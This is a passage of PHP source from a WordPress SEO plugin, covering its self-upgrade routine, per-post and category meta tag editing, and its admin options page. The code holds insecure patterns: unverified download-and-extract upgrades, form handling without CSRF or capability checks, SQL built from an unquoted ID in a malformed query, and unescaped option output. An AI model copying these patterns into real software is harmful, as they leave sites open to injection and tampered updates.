	    $file_content = $this->get_url($this->upgrade_url);
	    if ($file_content === false) {
	    	$this->upgrade_error = sprintf(__("Could not download distribution (%s)"), $this->upgrade_url);
			$success = false;
	    } else if (strlen($file_content) < 100) {
	    	$this->upgrade_error = sprintf(__("Could not download distribution (%s): %s"), $this->upgrade_url, $file_content);
			$success = false;
	    } else {
	    	$this->log(sprintf("filesize of download ZIP: %d", strlen($file_content)));
		    $fh = @fopen($this->upgrade_filename, 'w');
		    $this->log("fh is $fh");
		    if (!$fh) {
		    	$this->upgrade_error = sprintf(__("Could not open %s for writing"), $this->upgrade_filename);
		    	$this->upgrade_error .= "<br />";
		    	$this->upgrade_error .= sprintf(__("Please make sure %s is writable"), $this->upgrade_folder);
		    	$success = false;
		    } else {
		    	$bytes_written = @fwrite($fh, $file_content);
			    $this->log("wrote $bytes_written bytes");
		    	if (!$bytes_written) {
			    	$this->upgrade_error = sprintf(__("Could not write to %s"), $this->upgrade_filename);
			    	$success = false;
		    	}
		    }
		    if ($success) {
		    	fclose($fh);
		    }
	    }
	    return $success;
	}

	function install_newest_version() {
		$success = $this->download_newest_version();
	    if ($success) {
		    $success = $this->extract_plugin();
		    unlink($this->upgrade_filename);
	    }
	    return $success;
	}

	function extract_plugin() {
	    if (!class_exists('PclZip')) {
	        require_once ('pclzip.lib.php');
	    }
	    $archive = new PclZip($this->upgrade_filename);
	    $files = $archive->extract(PCLZIP_OPT_STOP_ON_ERROR, PCLZIP_OPT_REPLACE_NEWER, PCLZIP_OPT_REMOVE_ALL_PATH, PCLZIP_OPT_PATH, $this->upgrade_folder);
	    $this->log("files is $files");
	    if (is_array($files)) {
	    	$num_extracted = sizeof($files);
		    $this->log("extracted $num_extracted files to $this->upgrade_folder");
		    $this->log(print_r($files, true));
	    	return true;
	    } else {
	    	$this->upgrade_error = $archive->errorInfo();
	    	return false;
	    }
	}
	
	/** crude approximization of whether current user is an admin */
	function is_admin() {
		return current_user_can('level_8');
	}
	
	function is_directory_writable($directory) {
		$filename = $directory . '/' . 'tmp_file_' . time();
		$fh = @fopen($filename, 'w');
		if (!$fh) {
			return false;
		}
		
		$written = fwrite($fh, "test");
		fclose($fh);
		unlink($filename);
		if ($written) {
			return true;
		} else {
			return false;
		}
	}

	function is_upgrade_directory_writable() {
		//return $this->is_directory_writable($this->upgrade_folder);
		// let's assume it is
		return true;
	}

	function post_meta_tags($id) {
	    $awmp_edit = $_POST["optiseo_edit"];
	    if (isset($awmp_edit) && !empty($awmp_edit)) {
		    $keywords = $_POST["optiseo_keywords"];
		    $description = $_POST["optiseo_description"];
		    $title = $_POST["optiseo_title"];
		    $optiseo_meta = $_POST["optiseo_meta"];
		    $optiseo_disable = $_POST["optiseo_disable"];

		    delete_post_meta($id, 'keywords');
		    delete_post_meta($id, 'description');
		    delete_post_meta($id, 'title');
		    if ($this->is_admin()) {
		    	delete_post_meta($id, 'optiseo_disable');
		    }
		    //delete_post_meta($id, 'optiseo_meta');

		    if (isset($keywords) && !empty($keywords)) {
			    add_post_meta($id, 'keywords', $keywords);
		    }
		    if (isset($description) && !empty($description)) {
			    add_post_meta($id, 'description', $description);
		    }
		    if (isset($title) && !empty($title)) {
			    add_post_meta($id, 'title', $title);
		    }
		    if (isset($optiseo_disable) && !empty($optiseo_disable) && $this->is_admin()) {
			    add_post_meta($id, 'optiseo_disable', $optiseo_disable);
		    }
		    /*
		    if (isset($optiseo_meta) && !empty($optiseo_meta)) {
			    add_post_meta($id, 'optiseo_meta', $optiseo_meta);
		    }
		    */
	    }
	}

	function edit_category($id) {
		global $wpdb;
		$id = $wpdb->escape($id);
	    $awmp_edit = $_POST["optiseo_edit"];
	    if (isset($awmp_edit) && !empty($awmp_edit)) {
		    $keywords = $wpdb->escape($_POST["optiseo_keywords"]);
		    $title = $wpdb->escape($_POST["optiseo_title"]);
		    $old_category = $wpdb->get_row("select * from $this->table_categories where category_id=$id", OBJECT);
		    if ($old_category) {
		    	$wpdb->query("update $this->table_categories
		    			set meta_title='$title', meta_keywords='$keywords'
		    			where category_id=$id");
		    } else {
		    	$wpdb->query("insert into $this->table_categories(meta_title, meta_keywords, category_id)
		    			values ('$title', '$keywords', $id");
		    }
		    //$wpdb->query("insert into $this->table_categories")
	    	/*
		    delete_post_meta($id, 'keywords');
		    delete_post_meta($id, 'description');
		    delete_post_meta($id, 'title');

		    if (isset($keywords) && !empty($keywords)) {
			    add_post_meta($id, 'keywords', $keywords);
		    }
		    if (isset($description) && !empty($description)) {
			    add_post_meta($id, 'description', $description);
		    }
		    if (isset($title) && !empty($title)) {
			    add_post_meta($id, 'title', $title);
		    }
		    */
	    }
	}

	/**
	 * @deprecated This was for the feature of dedicated meta tags for categories which never went mainstream.
	 */
	function edit_category_form() {
	    global $post;
	    $keywords = stripcslashes(get_post_meta($post->ID, 'keywords', true));
	    $title = stripcslashes(get_post_meta($post->ID, 'title', true));
	    $description = stripcslashes(get_post_meta($post->ID, 'description', true));
		?>
		<input value="optiseo_edit" type="hidden" name="optiseo_edit" />
		<table class="editform" width="100%" cellspacing="2" cellpadding="5">
		<tr>
		<th width="33%" scope="row" valign="top">
		<a href="http://optionseo.weebly.com"><?php _e('OPTI SEO', 'OPTI_SEO') ?></a>
		</th>
		</tr>
		<tr>
		<th width="33%" scope="row" valign="top"><label for="optiseo_title"><?php _e('Title:', 'OPTI_SEO') ?></label></th>
		<td><input value="<?php echo $title ?>" type="text" name="optiseo_title" size="70"/></td>
		</tr>
		<tr>
		<th width="33%" scope="row" valign="top"><label for="optiseo_keywords"><?php _e('Keywords (comma separated):', 'OPTI_SEO') ?></label></th>
		<td><input value="<?php echo $keywords ?>" type="text" name="optiseo_keywords" size="70"/></td>
		</tr>
		</table>
		<?php
	}

	function add_meta_tags_textinput() {
	    global $post;
	    $post_id = $post;
	    if (is_object($post_id)) {
	    	$post_id = $post_id->ID;
	    }
	    $keywords = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'keywords', true)));
	    $title = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'title', true)));
	    $description = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'description', true)));
	    $optiseo_meta = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'optiseo_meta', true)));
	    $optiseo_disable = htmlspecialchars(stripcslashes(get_post_meta($post_id, 'optiseo_disable', true)));
		?>
		<SCRIPT LANGUAGE="JavaScript">
		<!-- Begin
		function countChars(field,cntfield) {
		cntfield.value = field.value.length;
		}
		//  End -->
		</script>

	 <?php if (substr($this->wp_version, 0, 3) >= '2.5') { ?>
                <div id="postoptiseo" class="postbox open">
                <h3><?php _e('OPTISEO', 'OPTI_SEO') ?></h3>
                <div class="inside">
                <div id="postoptiseo">
                <?php } else { ?>
                <div class="dbx-b-ox-wrapper">
                <fieldset id="seodiv" class="dbx-box">
                <div class="dbx-h-andle-wrapper">
                <h3 class="dbx-handle"><?php _e('OPTISEO', 'OPTI_SEO') ?></h3>
                </div>
                <div class="dbx-c-ontent-wrapper">
                <div class="dbx-content">
                <?php } ?>
	

		<input value="optiseo_edit" type="hidden" name="optiseo_edit" />
		<table style="margin-bottom:40px">
		<tr>
		<th style="text-align:left;" colspan="2">
		</th>
		</tr>
		<tr>
		<th scope="row" style="text-align:right;"><?php _e('Title:', 'opti_seo') ?></th>
		<td><input value="<?php echo $title ?>" type="text" name="optiseo_title" size="62"/></td>
		</tr>
		<tr>
		<th scope="row" style="text-align:right; vertical-align:top; padding-top:9px"><?php _e('Description:', 'opti_seo') ?></th>
		<td><textarea name="optiseo_description" rows="2" cols="60"
		onKeyDown="countChars(document.post.optiseo_description,document.post.length1)"
		onKeyUp="countChars(document.post.optiseo_description,document.post.length1)"><?php echo $description ?></textarea><br />
		<input readonly type="text" name="length1" size="3" maxlength="3" value="<?php echo strlen($description);?>" />
		<?php _e(' characters. Most search engines use a maximum of 160 chars for the description.', 'opti_seo') ?>
		</td>
		</tr>
		<tr>
		<th scope="row" style="text-align:right;"><?php _e('Keywords:', 'opti_seo') ?></th>
		<td><input value="<?php echo $keywords ?>" type="text" name="optiseo_keywords" size="62"/></td>
		</tr>

		<?php if ($this->is_admin()) { ?>
		<tr>
		<th scope="row" style="text-align:right; vertical-align:top;">
		<?php _e('Disable:', 'opti_seo')?>
		</th>
		<td>
		<input type="checkbox" name="optiseo_disable" <?php if ($optiseo_disable) echo "checked=\"1\""; ?>/>
		</td>
		</tr>
		<?php } ?>

		</table>
		
		<?php if (substr($this->wp_version, 0, 3) >= '2.5') { ?>
		</div></div></div>
		<?php } else { ?>
		</div>
		</fieldset>
		</div>
		<?php } ?>

		<?php
	}

	function admin_menu() {
		$file = __FILE__;
		
		// hack for 1.5
		if (substr($this->wp_version, 0, 3) == '1.5') {
			$file = 'opti-seo/opti-seo.php';
		}
		add_submenu_page('options-general.php', __('OPTI SEO', 'opti_seo'), __('OPTI SEO', 'opti_seo'), 10, $file, array($this, 'options_panel'));
	}
	
	function management_panel() {
		$message = null;
		$base_url = "edit.php?page=" . __FILE__;
		//echo($base_url);
		$type = $_REQUEST['type'];
		if (!isset($type)) {
			$type = "posts";
		}
?>

  <ul class="optiseo_menu">
    <li><a href="<?php echo $base_url ?>&type=posts">Posts</a>
    </li>
    <li><a href="<?php echo $base_url ?>&type=pages">Pages</a>
    </li>
  </ul>
  
<?php

		if ($type == "posts") {
			echo("posts");
		} elseif ($type == "pages") {
			echo("pages");
		}

	}

	function options_panel() {
		$message = null;
		$message_updated = __("OPTI SEO options saved.", 'opti_seo');
		
		// update options
		if ($_POST['action'] && $_POST['action'] == 'optiseo_update') {
			$message = $message_updated;
			// update_option('optiseo_home_title', $_POST['optiseo_home_title']);
			// update_option('optiseo_home_description', $_POST['optiseo_home_description']);
			// update_option('optiseo_home_keywords', $_POST['optiseo_home_keywords']);
			// update_option('optiseo_max_words_excerpt', $_POST['optiseo_max_words_excerpt']);
			// update_option('optiseo_rewrite_titles', $_POST['optiseo_rewrite_titles']);
			update_option('optiseo_post_title_format', $_POST['optiseo_post_title_format']);
			update_option('optiseo_page_title_format', $_POST['optiseo_page_title_format']);
			update_option('optiseo_category_title_format', $_POST['optiseo_category_title_format']);
			update_option('optiseo_archive_title_format', $_POST['optiseo_archive_title_format']);
			update_option('optiseo_tag_title_format', $_POST['optiseo_tag_title_format']);
			update_option('optiseo_search_title_format', $_POST['optiseo_search_title_format']);
			update_option('optiseo_404_title_format', $_POST['optiseo_404_title_format']);
			update_option('optiseo_paged_format', $_POST['optiseo_paged_format']);
			// update_option('optiseo_use_categories', $_POST['optiseo_use_categories']);
			update_option('optiseo_category_noindex', $_POST['optiseo_category_noindex']);
			update_option('optiseo_archive_noindex', $_POST['optiseo_archive_noindex']);
			update_option('optiseo_tags_noindex', $_POST['optiseo_tags_noindex']);
			// update_option('optiseo_generate_descriptions', $_POST['optiseo_generate_descriptions']);
			update_option('optiseo_debug_info', $_POST['optiseo_debug_info']);
			// update_option('optiseo_post_meta_tags', $_POST['optiseo_post_meta_tags']);
			// update_option('optiseo_page_meta_tags', $_POST['optiseo_page_meta_tags']);
			// update_option('optiseo_home_meta_tags', $_POST['optiseo_home_meta_tags']);
			update_option('optiseo_do_log', $_POST['optiseo_do_log']);
			update_option('optiseo_disable_comments_in_source', $_POST['optiseo_disable_comments_in_source']);
			
			if (function_exists('wp_cache_flush')) {
				wp_cache_flush();
			}
		} elseif ($_POST['optiseo_upgrade']) {
			$message = __("You have been upgraded to the newest version. Please revisit the options page to double check.", 'opti_seo');
			$success = $this->install_newest_version();
			if (!$success) {
				$message = __("The upgrade failed", 'opti_seo');
				if (isset($this->upgrade_error) && !empty($this->upgrade_error)) {
					$message .= ": " . $this->upgrade_error;
				} else {
					$message .= ".";
				}
			}
		}

?>
<?php if ($message) : ?>
<div id="message" class="updated fade"><p><?php echo $message; ?></p></div>
<?php endif; ?>
<div id="dropmessage" class="updated" style="display:none;"></div>
<div class="wrap">
<h2><?php _e('OPTI SEO Plugin Options', 'opti_seo'); ?></h2>
<p><?php _e("Version ", 'opti_seo') ?><?php _e("$this->version ", 'opti_seo') ?></p>
<p>


</p>

<script type="text/javascript">
<!--
    function toggleVisibility(id) {
       var e = document.getElementById(id);
       if(e.style.display == 'block')
          e.style.display = 'none';
       else
          e.style.display = 'block';
    }
//-->
</script>

<h3><?php _e('Click on option titles to get help!', 'opti_seo') ?></h3>

<form name="dofollow" action="" method="post">
<table class="form-table">

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_post_title_format_tip');">
<?php _e('Post Title Format:', 'opti_seo')?>
</a>
</td>
<td>
<input size="59" name="optiseo_post_title_format" value="<?php echo stripcslashes(get_option('optiseo_post_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_post_title_format_tip">
<?php
_e('The following macros are supported:', 'opti_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%post_title% - The original title of the post', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%category_title% - The (main) category of the post', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%category% - Alias for %category_title%', 'opti_seo'); echo('</li>');
echo('<li>'); _e("%post_author_login% - This post's author' login", 'opti_seo'); echo('</li>');
echo('<li>'); _e("%post_author_nicename% - This post's author' nicename", 'opti_seo'); echo('</li>');
echo('<li>'); _e("%post_author_firstname% - This post's author' first name (capitalized)", 'opti_seo'); echo('</li>');
echo('<li>'); _e("%post_author_lastname% - This post's author' last name (capitalized)", 'opti_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_page_title_format_tip');">
<?php _e('Page Title Format:', 'opti_seo')?>
</a>
</td>
<td>
<input size="59" name="optiseo_page_title_format" value="<?php echo stripcslashes(get_option('optiseo_page_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_page_title_format_tip">
<?php
_e('The following macros are supported:', 'opti_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%page_title% - The original title of the page', 'opti_seo'); echo('</li>');
echo('<li>'); _e("%page_author_login% - This page's author' login", 'opti_seo'); echo('</li>');
echo('<li>'); _e("%page_author_nicename% - This page's author' nicename", 'opti_seo'); echo('</li>');
echo('<li>'); _e("%page_author_firstname% - This page's author' first name (capitalized)", 'opti_seo'); echo('</li>');
echo('<li>'); _e("%page_author_lastname% - This page's author' last name (capitalized)", 'opti_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_category_title_format_tip');">
<?php _e('Category Title Format:', 'opti_seo')?>
</a>
</td>
<td>
<input size="59" name="optiseo_category_title_format" value="<?php echo stripcslashes(get_option('optiseo_category_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_category_title_format_tip">
<?php
_e('The following macros are supported:', 'opti_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%category_title% - The original title of the category', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%category_description% - The description of the category', 'opti_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_archive_title_format_tip');">
<?php _e('Archive Title Format:', 'opti_seo')?>
</a>
</td>
<td>
<input size="59" name="optiseo_archive_title_format" value="<?php echo stripcslashes(get_option('optiseo_archive_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_archive_title_format_tip">
<?php
_e('The following macros are supported:', 'opti_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%date% - The original archive title given by wordpress, e.g. "2007" or "2007 August"', 'opti_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_tag_title_format_tip');">
<?php _e('Tag Title Format:', 'opti_seo')?>
</a>
</td>
<td>
<input size="59" name="optiseo_tag_title_format" value="<?php echo stripcslashes(get_option('optiseo_tag_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_tag_title_format_tip">
<?php
_e('The following macros are supported:', 'opti_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%tag% - The name of the tag', 'opti_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_search_title_format_tip');">
<?php _e('Search Title Format:', 'opti_seo')?>
</a>
</td>
<td>
<input size="59" name="optiseo_search_title_format" value="<?php echo stripcslashes(get_option('optiseo_search_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_search_title_format_tip">
<?php
_e('The following macros are supported:', 'opti_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%search% - What was searched for', 'opti_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_404_title_format_tip');">
<?php _e('404 Title Format:', 'opti_seo')?>
</a>
</td>
<td>
<input size="59" name="optiseo_404_title_format" value="<?php echo stripcslashes(get_option('optiseo_404_title_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_404_title_format_tip">
<?php
_e('The following macros are supported:', 'opti_seo');
echo('<ul>');
echo('<li>'); _e('%blog_title% - Your blog title', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%blog_description% - Your blog description', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%request_url% - The original URL path, like "/url-that-does-not-exist/"', 'opti_seo'); echo('</li>');
echo('<li>'); _e('%request_words% - The URL path in human readable form, like "Url That Does Not Exist"', 'opti_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_paged_format_tip');">
<?php _e('Paged Format:', 'opti_seo')?>
</a>
</td>
<td>
<input size="59" name="optiseo_paged_format" value="<?php echo stripcslashes(get_option('optiseo_paged_format')); ?>"/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_paged_format_tip">
<?php
_e('This string gets appended/prepended to titles when they are for paged index pages (like home or archive pages).', 'opti_seo');
_e('The following macros are supported:', 'opti_seo');
echo('<ul>');
echo('<li>'); _e('%page% - The page number', 'opti_seo'); echo('</li>');
echo('</ul>');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_category_noindex_tip');">
<?php _e('Use noindex for Categories:', 'opti_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="optiseo_category_noindex" <?php if (get_option('optiseo_category_noindex')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_category_noindex_tip">
<?php
_e('Exclude category pages from being crawled. Useful for avoiding duplicate content.', 'opti_seo');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_archive_noindex_tip');">
<?php _e('Use noindex for Archives:', 'opti_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="optiseo_archive_noindex" <?php if (get_option('optiseo_archive_noindex')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_archive_noindex_tip">
<?php
_e('Exclude archive pages from being crawled. Useful for avoiding duplicate content.', 'opti_seo');
 ?>
</div>
</td>
</tr>

<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'opti_seo')?>" onclick="toggleVisibility('optiseo_tags_noindex_tip');">
<?php _e('Use noindex for Tag Archives:', 'opti_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="optiseo_tags_noindex" <?php if (get_option('optiseo_tags_noindex')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_tags_noindex_tip">
<?php
_e('Exclude tag pages from being crawled. Useful for avoiding duplicate content.', 'opti_seo');
 ?>
</div>
</td>
</tr>


<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'auto_social')?>" onclick="toggleVisibility('optiseo_do_log_tip');">
<?php _e('Log important events:', 'opti_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="optiseo_do_log" <?php if (get_option('optiseo_do_log')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_do_log_tip">
<?php
_e('Create a log of important events (opti_seo.log) in the plugin\'s directory. Helpful for debugging. Make sure you can write the file.', 'opti_seo');
 ?>
</div>
</td>
</tr>





<tr>
<th scope="row" style="text-align:right; vertical-align:top;">
<a style="cursor:pointer;" title="<?php _e('Click for Help!', 'auto_social')?>" onclick="toggleVisibility('optiseo_disable_comments_in_source_tip');">
<?php _e('Show Comments in Source:', 'opti_seo')?>
</a>
</td>
<td>
<input type="checkbox" name="optiseo_disable_comments_in_source" <?php if (get_option('optiseo_disable_comments_in_source')) echo "checked=\"1\""; ?>/>
<div style="max-width:500px; text-align:left; display:none" id="optiseo_disable_comments_in_source_tip">
<?php
_e('Enable comments in the text of the rendered HTML document.', 'opti_seo');
 ?>
</div>
</td>
</tr>

</table>
<p class="submit">
<input type="hidden" name="action" value="optiseo_update" /> 
<input type="hidden" name="page_options" value="optiseo_home_description" /> 
<input type="submit" name="Submit" value="<?php _e('Update Options', 'opti_seo')?> &raquo;" /> 
</p>
</form>
</div>
<?php
	
	} // options_panel

}

add_option("optiseo_post_title_format", '%post_title% | %blog_title%', 'OPTISEO Plugin Post Title Format', 'yes');
add_option("optiseo_page_title_format", '%page_title% | %blog_title%', 'OPTISEO Plugin Page Title Format', 'yes');
add_option("optiseo_category_title_format", '%category_title% | %blog_title%', 'OPTISEO Plugin Category Title Format', 'yes');
add_option("optiseo_archive_title_format", '%date% | %blog_title%', 'OPTISEO Plugin Archive Title Format', 'yes');
add_option("optiseo_tag_title_format", '%tag% | %blog_title%', 'OPTISEO Plugin Tag Title Format', 'yes');
add_option("optiseo_search_title_format", '%search% | %blog_title%', 'OPTISEO Plugin Search Title Format', 'yes');
add_option("optiseo_404_title_format", 'Nothing found for %request_words%', 'OPTISEO Plugin 404 Title Format', 'yes');
add_option("optiseo_paged_format", ' - Part %page%', 'OPTISEO Plugin Paged Format', 'yes');
add_option("optiseo_do_log", null, 'OPTISEO Plugin write log file', 'yes');
add_option("optiseo_disable_comments_in_source", "yes", 'OPTISEO Plugin disable comments in HTML source', 'yes');

$optiseo = new opti_seo();
add_action('wp_head', array($optiseo, 'wp_head'));
add_action('template_redirect', array($optiseo, 'template_redirect'));

add_action('init', array($optiseo, 'init'));

if (substr($optiseo->wp_version, 0, 3) >= '2.5') {
	add_action('edit_form_advanced', array($optiseo, 'add_meta_tags_textinput'));
	add_action('edit_page_form', array($optiseo, 'add_meta_tags_textinput'));
} else {
	add_action('dbx_post_advanced', array($optiseo, 'add_meta_tags_textinput'));
	add_action('dbx_page_advanced', array($optiseo, 'add_meta_tags_textinput'));
}

add_action('edit_post', array($optiseo, 'post_meta_tags'));
add_action('publish_post', array($optiseo, 'post_meta_tags'));
add_action('save_post', array($optiseo, 'post_meta_tags'));
add_action('edit_page_form', array($optiseo, 'post_meta_tags'));

add_action('admin_menu', array($optiseo, 'admin_menu'));
?>
